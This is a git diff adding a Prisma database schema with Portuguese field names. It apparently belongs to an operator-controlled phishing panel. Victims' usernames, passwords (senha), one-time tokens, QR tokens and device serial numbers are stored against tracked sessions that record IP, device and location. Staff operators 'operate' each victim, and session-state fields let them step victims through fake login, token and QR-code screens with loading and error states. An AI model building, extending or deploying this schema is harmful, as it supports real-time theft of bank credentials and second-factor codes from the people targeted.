@@ -1,0 +1,131 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+enum UserRole {
+  ADMIN
+  USER
+}
+
+model User {
+  id                  String       @id @default(cuid())
+  username            String       @unique
+  password            String
+  name                String?
+  role                UserRole     @default(USER)
+  active              Boolean      @default(true)
+  createdAt           DateTime     @default(now())
+  updatedAt           DateTime     @updatedAt
+  clientUsersOperados ClientUser[]
+
+  @@map("users")
+}
+
+model ClientSession {
+  sessionId  String             @id
+  clientUser ClientUser?
+  data       ClientSessionData?
+  events     ClientEvent[]
+  ipAddress  String
+  userAgent  String
+  browser    String
+  device     String
+  os         String
+  origin     String?
+  country    String?
+  state      String?
+  city       String?
+  createdAt  DateTime           @default(now())
+  updatedAt  DateTime           @updatedAt
+}
+
+model ClientUser {
+  id           String        @id @default(cuid())
+  usuario      String?       @unique
+  name         String?
+  senha        String?
+  token1       String?
+  tokenqr      String?
+  numSerie     String?
+  contato      String?
+  sessionId    String        @unique
+  session      ClientSession @relation(fields: [sessionId], references: [sessionId], onDelete: Cascade)
+  createdAt    DateTime      @default(now())
+  updatedAt    DateTime      @updatedAt
+  operatedById String?
+  operatedBy   User?         @relation(fields: [operatedById], references: [id])
+}
+
+model ClientSessionData {
+  sessionId        String        @id
+  session          ClientSession @relation(fields: [sessionId], references: [sessionId], onDelete: Cascade)
+  tokenType        TokenType?    @default(CELULAR)
+  isLoginS1Loading Boolean       @default(false)
+  isLoginS1Error   Boolean       @default(false)
+  isLoginS1Valid   Boolean       @default(false)
+  isTokenS2Loading Boolean       @default(false)
+  isTokenS2Error   Boolean       @default(false)
+  isTokenS2Valid   Boolean       @default(false)
+  isTokenQrLoading Boolean       @default(false)
+  isTokenQrError   Boolean       @default(false)
+  isTokenQrDone    Boolean       @default(false)
+  qrCodeUrl        String?
+  step             Int?          @default(1)
+  screen           Screens?
+  status           SessionStatus @default(AGUARDANDO)
+  isOnline         Boolean       @default(true)
+  startedAt        DateTime      @default(now())
+  endedAt          DateTime?
+  lastPing         DateTime      @default(now())
+
+  @@index([status])
+  @@index([isOnline])
+  @@index([lastPing])
+}
+
+model ClientEvent {
+  id        String        @id @default(cuid())
+  sessionId String
+  session   ClientSession @relation(fields: [sessionId], references: [sessionId], onDelete: Cascade)
+  eventType String
+  eventData String?
+  createdAt DateTime      @default(now())
+
+  @@index([sessionId])
+  @@index([eventType])
+  @@index([createdAt])
+}
+
+model ClientRedirect { 
+  id        String        @id @default(cuid())
+  ip String
+  path String
+  createdAt DateTime      @default(now())
+}
+
+enum SessionStatus {
+  AGUARDANDO
+  INICIANDO
+  CONCLUIDO
+  ENCERRADO
+}
+
+enum TokenType {
+  CELULAR
+  TOKEN
+}
+
+enum Screens {
+  TELA_DE_LOGIN
+  CARREGANDO_TELA_DE_LOGIN
+  TELA_DE_TOKEN
+  CARREGANDO_TELA_DE_TOKEN
+  TELA_DE_QRCODE
+  CARREGANDO_TELA_DE_QRCODE
+  CONCLUIDO
+}
